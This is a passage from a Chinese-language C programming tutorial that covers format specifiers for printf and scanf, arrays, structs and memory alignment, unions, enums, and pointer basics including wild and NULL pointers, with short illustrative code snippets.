[标志][输出最小宽度][.精度][长度]类型</code><ul><li>类型：类型字符用以表示输出数据的类型</li></ul></li></ul><table><thead><tr><th>类型</th><th>语义</th><th>Example</th></tr></thead><tbody><tr><td>%d / %i</td><td>有符号 10 进制整型</td><td>392</td></tr><tr><td>%u</td><td>无符号 10 进制整型</td><td>7235</td></tr><tr><td>%o</td><td>无符号 8 进制整型</td><td>610</td></tr><tr><td>%x</td><td>无符号 16 进制整型</td><td>7fa</td></tr><tr><td>%X</td><td>无符号 16 进制整型(大写)</td><td>7FA</td></tr><tr><td>%f</td><td>单/双精度浮点型(默认打印六位小数)</td><td>392.650000</td></tr><tr><td>%e</td><td>科学计数 e</td><td>3.9265e+2</td></tr><tr><td>%E</td><td>科学计数 E</td><td>3.9265E+2</td></tr><tr><td>%g</td><td>%e or %f 的缩短版</td><td>392.65</td></tr><tr><td>%G</td><td>%E or %F 的缩短版</td><td>392.65</td></tr><tr><td>%c</td><td>字符</td><td>a</td></tr><tr><td>%s</td><td>字符串</td><td>sample</td></tr><tr><td>%p</td><td>地址</td><td>b8000000</td></tr></tbody></table><ul><li>宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或 0。</li></ul><table><thead><tr><th>标志</th><th>意义</th></tr></thead><tbody><tr><td><code>-</code></td><td>左对齐；默认右对齐</td></tr><tr><td><code>+</code></td><td>当一个数为正数时，前面加上一个+号，默认不显示</td></tr><tr><td><code>0</code></td><td>右对齐时，用 0 填充左边未使用的列；默认用空格填充空格 输出值为正时冠以空格，为负时冠以负号</td></tr><tr><td><code>#</code></td><td>对 o 类，在输出时加前缀 o；对 x 类，在输出时加前缀 0x；对 c、s、d、u 类无影响</td></tr></tbody></table><ul><li>精度：精度格式符以“.”开头，后跟十进制整数。本项的意义是：如果输出数字，则表示小数的位数；如果输出的是字符，则表示输出字符的个数；若实际位数大于所定义的精度数，则截去超过的部分。</li><li>长度：</li></ul><table><thead><tr><th>length</th><th>d i</th><th>u o x X</th><th>f F e E g G a</th><th>c</th><th>s</th><th>p</th></tr></thead><tbody><tr><td>(none)</td><td>int</td><td>unsigned int</td><td>float/double</td><td>int</td><td>char*</td><td>void*</td></tr><tr><td>hh</td><td>signed char</td><td>unsigned char</td><td></td><td></td><td></td><td></td></tr><tr><td>h</td><td>short int unsigned short int</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>l</td><td>long int</td><td>unsigned long int</td><td></td><td>wint_t</td><td>wchar_t*</td><td></td></tr><tr><td>ll</td><td>long long、int</td><td>unsigned long long、int</td><td></td><td></td><td></td><td></td></tr><tr><td>L</td><td></td><td></td><td>long double</td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>注意： hh Lf 的平台差异性</p></blockquote><h5 id="printf"><a class="markdownIt-Anchor" href="#printf"></a> printf</h5><ul><li>printf 函数称为格式输出函数，其关键字最末一个字母 f 即为“格式”(format)之意。其功能是按用户指定的格式，把指定的数据显示到显示器屏幕上。</li><li>printf 函数调用的一般形式：<code>printf(“ 格式控制字符串“, [输出表列])</code>;</li></ul><h5 id="scanf"><a class="markdownIt-Anchor" href="#scanf"></a> scanf</h5><ul><li>scanf 函数的一般形式为：<code>scanf(“格式控制字符串”, 地址表列);</code></li><li>注意事项：<ol><li>待输入变量，必是以其地址的方式呈现。</li><li>除格式字符，空格，回车，Tab 外，其它需要原样输入。</li><li>空格 ，Tab， 回车，均可作为输入间隔，以回车作为结束。</li><li>scanf 函数中没有精度控制，如：scanf(&quot;%5.2f&quot;,&amp;a); 是非法的。不能企图用此语句输入小数为 2 位的实数。</li><li>在输入字符数据时，若格式控制串中无非格式字符，则认为所有输入的字符均为有效字符。%d %c %c %c</li><li>如输入的数据与输出的类型不一致时，虽然编译能够通过，但结果将不正确。</li><li>用scanf函数输入字符时，要在输入控制符%c前面加空格。空格就是用来屏蔽空白符的，%c前没空格，scanf()将读取标准输入流中的第一个字符，%c前有空格，scanf()则读取标准输入流中第一个非空白字符。</li></ol></li></ul><h5 id="putchar-getchar"><a class="markdownIt-Anchor" href="#putchar-getchar"></a> putchar &amp;&amp; getchar</h5><ul><li>putchar形式为：<code>int putchar ( int character );</code>向屏幕输出一个字符</li><li>getchar形式为：<code>int getchar ( void );</code>从键盘获得一个字符</li></ul><h5 id="puts"><a class="markdownIt-Anchor" href="#puts"></a> puts</h5><ul><li><code>puts(&quot;&quot;);</code>实现换行</li></ul><h2 id="构造类型"><a class="markdownIt-Anchor" href="#构造类型"></a> 构造类型</h2><ul><li>由基本类型组合而成</li></ul><h3 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h3><ul><li>数组，在内存中是一段连续的存储区域 。</li></ul><h4 id="一维数组"><a class="markdownIt-Anchor" href="#一维数组"></a> 一维数组</h4><ul><li>逻辑与声明：<code>int [10] array; =&gt; int array[10];</code></li><li>初始化共分五种情况：<ol><li>不初始化 =&gt; 成员初始值未知</li><li>全初始化</li><li>部分初始化 =&gt; 未初始化的部分，自动初始化为零</li><li>满初始化 =&gt; 越界并不潇洒</li><li>不指定大小初始化 =&gt; 经常出没</li></ol></li></ul><h4 id="二维数组"><a class="markdownIt-Anchor" href="#二维数组"></a> 二维数组</h4><ul><li>声明：<code>int[4] array[3] =&gt; int array[3][4];</code></li><li>初始化：<ol><li>不初始化 =&gt;成员初始值未知</li><li>全初始化</li><li>部分初始化(行，全局) =&gt;未初始化成员，自动清零</li><li>满初始化 =&gt;这样太过分了</li><li>不指定行大小初始化 =&gt;新常态</li></ol></li></ul><p><img src="/images/pasted-44.png" alt="二维数组" /></p><h4 id="成员访问"><a class="markdownIt-Anchor" href="#成员访问"></a> 成员访问</h4><ul><li>所有学习过，C 语言的人，可能都会有一个疑问，数组的下标为什么从零开始。</li><li>因为 c 语言，脱胎于汇编语言，稍微懂点汇编的人，就知道 <code>[ ]</code>是一种<code>基址变址运算符</code>。基于起始位置偏移 0 个单位处，开始存放数据，故下标从 0 处开始。</li><li><code>arr = &amp;arr[0]</code>；<code>arr[0] = &amp;arr[0][0]</code>,<code>&amp;:reference; * dereference</code></li><li>一维数组的<code>arr+1</code>跳跃一个<code>int</code>单位，二维数组的<code>arr+1</code>跳跃一个<code>int[n]</code>单位。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,arr[<span class="number">1</span>],<span class="number">1</span>[arr]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,*(arr+<span class="number">1</span>),*(<span class="number">1</span>+arr));</span><br><span class="line"><span class="keyword">int</span> arr2[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>,arr2,arr2+<span class="number">1</span>); <span class="comment">//相差一行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>,arr2,arr2[<span class="number">0</span>]+<span class="number">1</span>); <span class="comment">//相差一个int大小</span></span><br></pre></td></tr></table></figure><h4 id="变长数组"><a class="markdownIt-Anchor" href="#变长数组"></a> 变长数组</h4><ul><li>C99 为了增加 c 语言的灵活性，提供了，变长数组的概念，（variable-length array)，也简称 VLA。即数组的大小，可以是变量。</li><li>变长数组，只有一次改变大小的机会，之后不能改变大小。VLA也不能初始化。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[size]; <span class="comment">//变长数组不能被初始化 = &#123;1,2,3,4,5&#125;;</span></span><br></pre></td></tr></table></figure><ul><li>不设置数组长度的初始化，二维数组的省略行。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">22</span>&#125;; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(<span class="built_in">array</span>)/<span class="keyword">sizeof</span>(<span class="built_in">array</span>[<span class="number">0</span>]); i++)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;array[%d] = %d\n&quot;</span>,i,<span class="built_in">array</span>[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> array2[][<span class="number">3</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="数组名的二义性"><a class="markdownIt-Anchor" href="#数组名的二义性"></a> 数组名的二义性</h4><ul><li><p>数组名，是数组的唯一标识符，既表示一种构造数据类型的大小，也表示访问组中的成员的首地址用来访问数据成员使用。</p></li><li><p>结构体的类型与成员访问，是分开的，为此增加了成员运算符。而数组名，却是一身而兼二任的，这也是简洁的需要。</p></li><li><p>一维数组名，从总体来看，他是一种构造类型，同时他又承担了，访问每个数组元素的责任。所以数组名， 就有两重性。</p></li><li><p>数组名，是数组的唯一标识符。二维数组也是如此，二维数组本质是一种嵌套关系，其本质是一种一维数组，每个一维数组成员又是一个一维数组。</p></li></ul><h3 id="结构体"><a class="markdownIt-Anchor" href="#结构体"></a> 结构体</h3><ul><li>struct 是构造新类型的关键字 ，有了它，就可以构造任意的构造类型了。</li></ul><h4 id="结构体定义"><a class="markdownIt-Anchor" href="#结构体定义"></a> 结构体定义</h4><table><thead><tr><th>结构体</th><th>定义</th><th>声明</th></tr></thead><tbody><tr><td>无名构造类型</td><td><code>struct&#123;char name[30];&#125;stu,stu2,stu3;</code></td><td></td></tr><tr><td>有名构造类型</td><td><code>struct student&#123;char name[30];&#125;stu;</code></td><td><code>struct student s1</code></td></tr><tr><td>别名构造体类型</td><td><code>typedef struct student&#123;char name[30];&#125;STUDENT;</code></td><td><code>STUDENT stu</code></td></tr></tbody></table><h4 id="typedef"><a class="markdownIt-Anchor" href="#typedef"></a> typedef</h4><ul><li><code>typedef</code>对现有类型取别名，不能创造新的类型<ul><li>用现有类型生成变量；</li><li>在变量定义之前加<code>typedef</code>；</li><li>将定义的变量换成其他的别名；</li></ul></li><li><code>typedef</code>和<code>#define</code>区别<ul><li><code>#define</code>是c语言的宏，在预处理阶段处理； <code>#define N int #endif</code></li><li><code>typedef</code>是c语言的语句，参与编译；</li></ul></li></ul><h4 id="结构体变量初始化"><a class="markdownIt-Anchor" href="#结构体变量初始化"></a> 结构体变量初始化</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span> = &#123;</span><span class="string">&quot;zhangsa&quot;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">45</span>,<span class="number">170</span>&#125;;</span><br><span class="line">STUDENT stu2 = &#123;<span class="string">&quot;zhangsa&quot;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">45</span>,<span class="number">170</span>&#125;;</span><br></pre></td></tr></table></figure><h4 id="结构体变量成员访问和赋值"><a class="markdownIt-Anchor" href="#结构体变量成员访问和赋值"></a> 结构体变量成员访问和赋值</h4><ul><li>结构体成员内存分布：首成员在低地址，尾成员在高地址。</li><li><strong>点成员运算符（.）</strong></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(stu.name,<span class="string">&quot;zhangsan&quot;</span>); <span class="comment">//通过strcpy进行赋值</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name = %s\n&quot;</span>,stu.name);</span><br></pre></td></tr></table></figure><ul><li><strong>指向成员运算符<code>-&gt;</code>,<code>(*).</code></strong>，常见有指向栈内存变量或指向堆内存变量的表示方法。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STUDENT stu s ; STUDENT stu * ps; <span class="comment">//*ps等价于s</span></span><br><span class="line"><span class="built_in">strcpy</span>(ps-&gt;name,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>((*ps).name,<span class="string">&quot;张三&quot;</span>);  <span class="comment">//ps-&gt;等价于(*ps).</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STUDENT * ps = &amp;stu; <span class="comment">//栈内存的指针表示法</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入姓名:&quot;</span>);<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ps-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name = %s\n&quot;</span>,ps-&gt;name);</span><br><span class="line">ps = (STUDENT*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(STUDENT)); <span class="comment">//堆内存的指针表示法</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入姓名:&quot;</span>);<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ps-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name = %s\n&quot;</span>,ps-&gt;name,ps-&gt;sex,ps-&gt;age,ps-&gt;high);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name = %s\n&quot;</span>,(*p).sname);</span><br><span class="line"><span class="built_in">free</span>(ps);</span><br></pre></td></tr></table></figure><ul><li>结构体之间的赋值，必须是同类型的：<code>STU s,s2;s=s2;</code></li><li>成员运算符的本质，依然是通过计算偏移来实现的。此处不考虑内存对齐等原因。</li></ul><h4 id="结构体数组"><a class="markdownIt-Anchor" href="#结构体数组"></a> 结构体数组</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STUDENT stu[<span class="number">4</span>] = &#123;</span><br><span class="line"> &#123;<span class="number">1001</span>,<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">100</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1002</span>,<span class="string">&quot;lisi&quot;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">89</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1003</span>,<span class="string">&quot;wangwu&quot;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">76</span>&#125;,</span><br><span class="line"> &#123;<span class="number">1004</span>,<span class="string">&quot;zhaoliu&quot;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">65</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="结构体嵌套"><a class="markdownIt-Anchor" href="#结构体嵌套"></a> 结构体嵌套</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> year;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line"> <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line"> <span class="keyword">char</span> sex;</span><br><span class="line"> <span class="keyword">int</span> age;</span><br><span class="line"> <span class="keyword">float</span> high;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">p</span>;</span> <span class="comment">// 格式：类型 变量</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">birthday</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> <span class="keyword">int</span> year;</span><br><span class="line"> <span class="keyword">int</span> month;</span><br><span class="line"> <span class="keyword">int</span> day;</span><br><span class="line"> &#125;birth; <span class="comment">// 如果未声明 birth 成员，直接使用成员 ???这个应该有默认变量名</span></span><br><span class="line">&#125;Stu;</span><br><span class="line">Stu s = &#123;<span class="string">&quot;1&quot;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="number">1</span>,<span class="number">1.0</span>,&#123;<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h4 id="结构体大小"><a class="markdownIt-Anchor" href="#结构体大小"></a> 结构体大小</h4><ul><li>结构体类型，本身不占有内存空间，只有它生成的变量才占有内存空间的。</li><li>首成员在低地址，尾成员在高地址。</li><li>内存对齐<ul><li>一个成员变量需要多个机器周期去读的现象，称为内存不对齐。为什么要对齐呢？本质是牺牲空间，换取时间的方法。</li></ul></li><li>对齐规则<ul><li>x86(linux 默认<code>#pragma pack(4)</code>, window 默认<code>#pragma pack(8))</code>。linux 最大支持 4字节对齐。</li><li>方法：<ol><li>取 pack(n)的值（n= 1 2 4 8…),取结构体中类型最大值 m。两者取小即为<font color="red">外对齐</font>大小<code>Y= (m&lt;n?m:n)</code>。</li><li>将每一个结构体的成员大小依次与Y比较，取小者为 X，作为<font color="red">内对齐</font>大小；</li><li>所谓按 X 对齐，即为地址(设起始地址为 0)能被 X 整除的地方开始存放数据；</li><li>外部对齐原则是依据 Y 的值(Y 的最小整数倍)，进行补空操作。</li></ol></li><li>Y用来进行空间跳转，最后没有填满的补0，X用来定位起始地址。外对齐和内对齐结合，可以充分利用内存空间。</li></ul></li></ul><h4 id="结构体易错的注意点"><a class="markdownIt-Anchor" href="#结构体易错的注意点"></a> 结构体易错的注意点</h4><ul><li><strong>向结构体内未初始化的指针拷贝</strong>：结构体中，包含指针，注意指针的赋值，切不可向未知区域拷贝。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="keyword">char</span>*name;</span><br><span class="line"> <span class="keyword">int</span> score;</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">strcpy</span>(stu.name,<span class="string">&quot;Jimy&quot;</span>);  <span class="comment">//直接赋值，会引发崩溃</span></span><br><span class="line"> <span class="comment">//正确做法：s.name = (char*)malloc(100); strcpy(stu.name,&quot;Jimy&quot;);</span></span><br><span class="line"> stu.score=<span class="number">99</span>;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">ps</span> = (<span class="title">struct</span> <span class="title">student</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">student</span>));</span>  <span class="comment">// 只为结构体在堆上开辟了空间，其成员指针的空间没有开辟，需要ps-&gt;name = (char*)malloc(100); </span></span><br><span class="line"><span class="built_in">strcpy</span>(ps-&gt;name,<span class="string">&quot;Jimy&quot;</span>);  <span class="comment">//直接赋值，会引发崩溃</span></span><br><span class="line"><span class="built_in">free</span>(ps-&gt;name);</span><br><span class="line"><span class="built_in">free</span>(ps);   <span class="comment">// 一定要先释放ps.name，在释放ps</span></span><br></pre></td></tr></table></figure><ul><li><strong>未释放结构体内指针所指向的空间</strong>：从内向外依次释放空间。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> s.name = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>); </span><br><span class="line"> <span class="built_in">strcpy</span>(stu.name,<span class="string">&quot;Jimy&quot;</span>);</span><br><span class="line"> stu.score=<span class="number">99</span>;</span><br><span class="line"> <span class="comment">//free(p-&gt;name); //由内而外的释放空间，不释放会造成内存泄漏。</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="共用"><a class="markdownIt-Anchor" href="#共用"></a> 共用</h3><ul><li><p>Union，在 C 语言中，不同的成员使用共同的存储区域的数据构造类型称为共用体，简称共用，又称联合体。共用体在定义、说明和使用形式上与结构体相似。两者本质上的不同仅在于使用内存的方式上。</p></li><li><p>特点</p><ul><li>共用体变量的地址和它的各成员的地址都是同一地址。</li><li>同一个内存段可以用来存放几种不同类型的成员，但在每一瞬时只能存放其中一种，而不是同时存放几种。</li><li>共用体变量中起作用的成员是最后一次存放的成员，在存入一个新的成员后原有的成员就失去作用。</li><li>共用体类型可以出现在结构体类型定义中，也可以定义共用体数组。反之，结构体也可以出现在共用体类型定义中，数组也可以作为共用体的成员。</li></ul></li></ul><h4 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> untest</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">char</span> c;</span><br><span class="line"> <span class="keyword">short</span> s;</span><br><span class="line"> <span class="keyword">int</span> i;</span><br><span class="line">&#125;myun;</span><br></pre></td></tr></table></figure><h4 id="内存分析"><a class="markdownIt-Anchor" href="#内存分析"></a> 内存分析</h4><ul><li>大小<ul><li>共用体占用空间的大小取决于类型长度最大的成员。</li><li>而结构体变量不考虑内存对齐，所占内存长度是各成员占的内存长度之和。每个成员分别占有其自己的内存单元。</li></ul></li><li>成员地址<ul><li>共用体变量<code>myun</code>的三个成员<code>myun.c</code>,<code>myun.s</code>和<code>myun.i</code>共用同一块内存（4个字节大小）。其中，<code>myun.c</code>只使用第一个字节,<code>myun.s</code>使用前两个字节而<code>myun.i</code>使用全部 4 个字节,三成员享有同一个起始地址。而结构体中每个成员均有自己的地址。</li><li>当我们给其中一个成员赋值时会影响到其他的成员。如 <code>myun.i = 0x11223344</code>，赋值后<code>myun.c</code>的值变成<code>0x44</code>，<code>myun.s</code>的值变成 <code>0x3344</code>。</li></ul></li></ul><p><img src="/images/pasted-46.png" alt="共用体内存" /></p><h4 id="应用"><a class="markdownIt-Anchor" href="#应用"></a> 应用</h4><ul><li>当需要把不同类型的变量存放到同一段内存单元或对同一段内存单元的数据按不同类型处理则需要使用共用体数据结构。</li><li>例如：有若干个人员的数据，其中有学生和老师。学生的数据包括：姓名，编号，性别，职业，年级。老师的数据包括：姓名，编号，性别，职业，职务。</li></ul><p><img src="/images/pasted-47.png" alt="人员信息" /></p><ul><li>union 在操作系统底层的代码中用的比较多，因为它在内存共享布局上方便且直观。所以网络编程，协议分析，内核代码上有一些用到 union，比较好懂，简化了设计。</li></ul><h3 id="枚举"><a class="markdownIt-Anchor" href="#枚举"></a> 枚举</h3><ul><li>枚举类型定义了一组整型常量的集合，目的是提高程序的可读性。它的语法跟结构体的语法相同。</li></ul><h4 id="枚举定义"><a class="markdownIt-Anchor" href="#枚举定义"></a> 枚举定义</h4><ul><li>枚举型是一个集合，集合中的元素(枚举成员)是一些命名的整型常量，元素之间用逗号(,)隔开。</li><li>第一个枚举成员的默认值为整型的 0，后续枚举成员的值在前一个成员上加 1。</li><li>可以人为设定枚举成员的值，从而自定义某个范围内的整数。</li><li>枚举型是预处理指令#define 的替代。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> DAY</span><br><span class="line">&#123;</span><br><span class="line">  MON=<span class="number">1</span>,TUE,WED,THU,FRI,SAT,SUN <span class="comment">//提供一组可选的常量</span></span><br><span class="line">&#125;; <span class="comment">//不设置起始，则默认从0开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mon 1  <span class="comment">//取代宏</span></span></span><br></pre></td></tr></table></figure><h2 id="指针"><a class="markdownIt-Anchor" href="#指针"></a> 指针</h2><ul><li>他是天使，也是魔鬼。</li></ul><h3 id="内存"><a class="markdownIt-Anchor" href="#内存"></a> 内存</h3><ul><li>内存是以字节为单位进行编址的，内存中的每个字节都对应一个地址，通过地址才能找到每个字节。</li></ul><h3 id="变量的地址"><a class="markdownIt-Anchor" href="#变量的地址"></a> 变量的地址</h3><ul><li>变量对应内存中的一段存储空间，该段存储空间占用一定的字节数，用这段存储空间的第一个字节的地址表示变量的地址，即低位字节的地址。</li><li>变量的地址，可以通过 <code>Reference (&amp;)</code> 引用运算符取得，在此可以称为取地址运算符。</li><li>通过运算的方式，我们可以求得变量的地址。32 位机的情况下，无论是什么类型大小均是 4。而 64 位机大小均是 8。这是由当前机型的地址总线决定的。</li></ul><h3 id="间接访问内存"><a class="markdownIt-Anchor" href="#间接访问内存"></a> 间接访问内存</h3><ul><li>我们拿到的变量的地址，其实，就是指针了。除了变量，我们还可以通过指针的方式间接的访问内存。</li><li><code>dereference (*)</code> 解引用运算符，在此处我们可以称为，取内容运算符。</li></ul><table><thead><tr><th>内容</th><th>指针</th><th>地址</th><th>取内容</th><th>取内容</th></tr></thead><tbody><tr><td><code>char a</code></td><td><code>&amp;a</code></td><td><code>0x0028FEBF</code></td><td><code>*(&amp;a)</code></td><td><code>*((char*)0x0028FEBF)</code></td></tr></tbody></table><ul><li>指针不是单纯的地址，而是有类型的地址。也就是说<code>&amp;a</code>进行取地址，取出来的地址是有类型的。</li><li>指针的类型，决定了该指针的寻址能力。即从指针所代表的地址处的寻址范围。</li></ul><h3 id="指针变量"><a class="markdownIt-Anchor" href="#指针变量"></a> 指针变量</h3><ul><li>定义：<code>type * variable;</code><ul><li><ul><li>表示该变量是一个指针变量。</li></ul></li><li>type 表示该变量的内存放的地址的寻址能力。</li></ul></li><li>初始化和简介访问</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> *p = (<span class="keyword">char</span>*)<span class="number">0x123456</span>; <span class="comment">//0x123456 是数值，(char*)0x123456 是指针</span></span><br><span class="line"> *p = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果直接赋给指针变量一个地址，对其访问是很危险的。因为，我们不知道此址处是否一块什么区域 ，有可能是一段内核区域 ，访问很可能会导致系统崩溃。</li><li>所以通常作法是，把一个己经开辟空间的变量的地址赋给指针变量。</li></ul><h3 id="null"><a class="markdownIt-Anchor" href="#null"></a> null</h3><h4 id="野指针"><a class="markdownIt-Anchor" href="#野指针"></a> 野指针</h4><ul><li>一个指针变量，如果，指向一段无效的空间，则该指针称为野指针，是由 <code>invalid pointer</code> 翻译过来，直译是无效指针。常见情型有两种，一种是未初化的指针，一种是指向一种己经被释放的空间。</li><li>对野指针的读或写崩溃尚可忍受，对野指针的写入成功，造成的后果是不可估量的。对野指针的读写操作，是危险而且是没有意义的。世上十之八九最难调的 bug皆跟它有关系。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> * p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*p);  <span class="comment">//系统禁止</span></span><br><span class="line">*p=<span class="number">100</span>;        <span class="comment">//系统禁止</span></span><br><span class="line"><span class="keyword">int</span> * p2 = <span class="literal">NULL</span>;  <span class="comment">// (void *) 0 = 等价于char，内存最小单元</span></span><br></pre></td></tr></table></figure><h4 id="null-指针零值无类型指针"><a class="markdownIt-Anchor" href="#null-指针零值无类型指针"></a> NULL 指针(零值无类型指针)</h4><ul><li>如何避免野指针呢，NULL 是一个宏，俗称空指针，他等价于指针<code>(void*)0</code>。<code>(void*) 0</code> 是一个很特别的指针，因为他是一个计算机黑洞，既读不出东西，也不写进东西去。所以被赋值 <code>NULL</code>的指针变量，进行读写操作，是不会有内存数据损坏的。</li><li>c 标准中是这样定义的：<code>define NULL ((void *)0)</code>,故常用 NULL 来给临时不需要初初始化的指针变量来进行初始化。或对己经被释放指向内存空间的指针赋值。</li><li>可以理解为 C 专门拿出了 <code>NULL</code>(零值无类型指针)，用于作标志位使用。</li></ul><h4 id="void-本质"><a class="markdownIt-Anchor" href="#void-本质"></a> void 本质</h4><ul><li>void 即无类型，可以赋给任意类型的指针，本质即代表内存的最小单位，在 32位机上地位等同于 char。</li></ul><h4 id="零所代表的意义"><a class="markdownIt-Anchor" href="#零所代表的意义"></a> 零所代表的意义</h4><table><thead><tr><th>零值</th><th>意义</th><th>备注</th></tr></thead><tbody><tr><td>0</td><td>整型数据的 0</td><td></td></tr><tr><td>0.0</td><td>实型数据的 0</td><td></td></tr><tr><td>NULL</td><td>指针型数据的 0</td><td>内存的 0 地址，用于初始化暂不用指针。或是标识己经被释放堆内存的指针。</td></tr><tr><td>‘\0’</td><td>转义字符型(ASCII 值为 0)</td><td>非可打印字符，用于标识字符串结束标记。</td></tr><tr><td>‘0’</td><td>字符型(ASCII 值为 48)</td><td>可打印字符，用于打印字符 0</td></tr><tr><td>“0”</td><td>字符串型</td><td>包含两个 ASCII 值 48 和 0</td></tr></tbody></table><h3 id="指针运算"><a class="markdownIt-Anchor" href="#指针运算"></a> 指针运算</h3><h4 id="赋值运算"><a class="markdownIt-Anchor" href="#赋值运算"></a> 赋值运算</h4><ul><li>区别初始化和赋值。不兼容类型赋值会发生类型丢失。为了避免隐式转化带来可能出现的错误，最好用强制转化显示的区别。</li></ul><figure class="highlight c"><table><tr><td 